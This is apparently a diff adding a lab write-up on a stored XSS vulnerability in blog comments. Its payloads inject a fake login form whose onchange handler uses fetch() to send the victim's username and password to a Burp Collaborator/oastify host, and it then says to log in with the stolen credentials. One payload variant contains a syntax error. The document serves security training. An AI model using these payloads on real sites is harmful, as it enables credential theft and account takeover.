@@ -1,0 +1,41 @@
+This lab contains a stored XSS vulnerability in the blog comments function. A simulated victim user views all comments after they are posted. To solve the lab, exploit the vulnerability to exfiltrate the victim's username and password then use these credentials to log in to the victim's account
+
+
+
+Step-1:
+
+ Using Burp Suite Professional, go to the Collaborator tab.
+
+Click "Copy to clipboard" to copy a unique Burp Collaborator payload to your clipboard.
+
+Submit the following payload in a blog comment, inserting your Burp Collaborator subdomain where indicated
+
+This script will make anyone who views the comment issue a POST request containing their username and password to your subdomain of the public Collaborator server
+
+<input name=username id=username>
+<input type=password name=password onchange="if(this.value.length)fetch('https://BURP-COLLABORATOR-SUBDOMAIN',{
+method:'POST',
+mode: 'no-cors',
+body:username.value+':'+this.value
+});">
+
+
+or
+
+<input name=username id=username>
+<input type=password name=password onchange="if(this.value.length)fetch('https://BURP-COLLABORATOR-SUBDOMAIN?username='username.value+'&password='+this.value)">
+
+
+<input id=username name=username>
+<input id=password type=password name=password onchange='if(this.value.length)fetch("https://oia4xo044ngolp69f7s7xli3ouulif64.oastify.com?username= "+username.value+ "&password=" +this.value)'>
+
+
+step-2:
+
+ Go back to the Collaborator tab, and click "Poll now". You should see an HTTP interaction. If you don't see any interactions listed, wait a few seconds and try again.
+
+Take a note of the value of the victim's username and password in the POST body.
+
+Use the credentials to log in as the victim user. 
+
+
